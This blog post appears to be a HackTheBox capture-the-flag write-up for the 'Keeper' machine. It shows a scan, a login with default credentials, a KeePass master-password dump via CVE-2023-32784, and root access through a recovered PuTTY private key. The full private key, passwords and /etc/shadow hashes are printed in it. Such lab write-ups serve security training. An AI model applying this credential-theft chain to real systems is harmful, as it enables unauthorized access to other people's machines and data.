---
layout: post
title: HTB{Keeper}
author: mr4ndr3w
tags: [write-up, hackthebox, machine, linux]
---
<!--cut-->

* TOC
{:toc}


### USER:

Scan [IP]:

`nmap -sC -sV -A [IP]`

```text
┌──(kali㉿kali)-[~/htb/machines/Keeper]
└─$ nmap -sC -sV -A -p- -Pn 10.10.11.227
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 12:29 EDT
Stats: 0:00:54 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 88.75% done; ETC: 12:30 (0:00:07 remaining)
Nmap scan report for tickets.keeper.htb (10.10.11.227)
Host is up (0.044s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Login
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.35 seconds

```

We can find that the default credentails for this tool are `root:password`.


```text
http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27
```
Find password:

```text
Username: lnorgaard
New user. Initial password set to Welcome2023!
```

Connect with ssh `lnorgaard` with password: `Welcome2023!`.

```text
┌──(kali㉿kali)-[~/htb/machines/Keeper]
└─$ ssh lnorgaard@10.10.11.227    
The authenticity of host '10.10.11.227 (10.10.11.227)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.227' (ED25519) to the list of known hosts.
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Tue Oct 17 18:29:36 2023 from 10.10.14.233
lnorgaard@keeper:~$ cat user.txt
0a690b4644597f5bf25922092a0ea760
```
### ROOT:


After some research, a vulnerability (CVE-2023-32784) was found, that would allow to dump the master password from keepass.dmp. However, the dumped password, **dgr*d med fl*de, was incomplete.

```text
┌──(kali㉿kali)-[~/htb/machines/Keeper/keepass_dump]
└─$ python3 keepass_dump.py -f ../KeePassDumpFull.dmp 
[*] Searching for masterkey characters
[-] Couldn't find jump points in file. Scanning with slower method.
[*] 0:  {UNKNOWN}
[*] 2:  d
[*] 3:  g
[*] 4:  r
[*] 6:  d
[*] 7:   
[*] 8:  m
[*] 9:  e
[*] 10: d
[*] 11:  
[*] 12: f
[*] 13: l
[*] 15: d
[*] 16: e
[*] Extracted: {UNKNOWN}dgrd med flde
```

Password `rødgrød med fløde`.

Using the web-based KeePass client at [https://app.keeweb.info/](https://app.keeweb.info/), I unlocked the .kdbx file with the password 'rødgrød med fløde'. Inside, I found the contents of a PuTTY PPK file for the root user:

```text
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

With puttygen, it's easy to convert the PPK to an id_rsa SSH private key, which allows to SSH into the machine as root. The journey concluded with the capture of the root flag:


```text
puttygen key.ppk -O private-openssh -o id_rsa

```

```text
chmod 600 id_rsa
```


```text
┌──(kali㉿kali)-[~/htb/machines/Keeper]
└─$ ssh -i id_rsa root@10.10.11.227            
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Oct 17 18:45:06 2023 from 10.10.15.0
root@keeper:~# cat root.txt 
2cf7b3deecd29a3a9400fb69a8020f33
root@keeper:~# cat /etc/shadow
root:$y$j9T$ZskeM1pGHOyGxzc3pg/bg/$jCd9wfODgoaD9Ax.4Pd9e3MTLOq9.FD3hf9cpM.VBM5:19501:0:99999:7:::
daemon:*:19500:0:99999:7:::
bin:*:19500:0:99999:7:::
sys:*:19500:0:99999:7:::
sync:*:19500:0:99999:7:::
games:*:19500:0:99999:7:::
man:*:19500:0:99999:7:::
lp:*:19500:0:99999:7:::
mail:*:19500:0:99999:7:::
news:*:19500:0:99999:7:::
uucp:*:19500:0:99999:7:::
proxy:*:19500:0:99999:7:::
www-data:*:19500:0:99999:7:::
backup:*:19500:0:99999:7:::
list:*:19500:0:99999:7:::
irc:*:19500:0:99999:7:::
gnats:*:19500:0:99999:7:::
nobody:*:19500:0:99999:7:::
systemd-network:*:19500:0:99999:7:::
systemd-resolve:*:19500:0:99999:7:::
systemd-timesync:*:19500:0:99999:7:::
messagebus:*:19500:0:99999:7:::
syslog:*:19500:0:99999:7:::
_apt:*:19500:0:99999:7:::
uuidd:*:19500:0:99999:7:::
tcpdump:*:19500:0:99999:7:::
lnorgaard:$y$j9T$qmixKwf75kn3y/SUlKSPg1$43ckVIMecnmD1abUBr5JsjgiivdcZ2MLQFDRooFK0f4:19501:0:99999:7:::
systemd-coredump:!!:19500::::::
sshd:*:19500:0:99999:7:::
mysql:!:19500:0:99999:7:::
fetchmail:*:19500:0:99999:7:::
postfix:*:19500:0:99999:7:::
_laurel:!:19565::::::
root@keeper:~# 

```

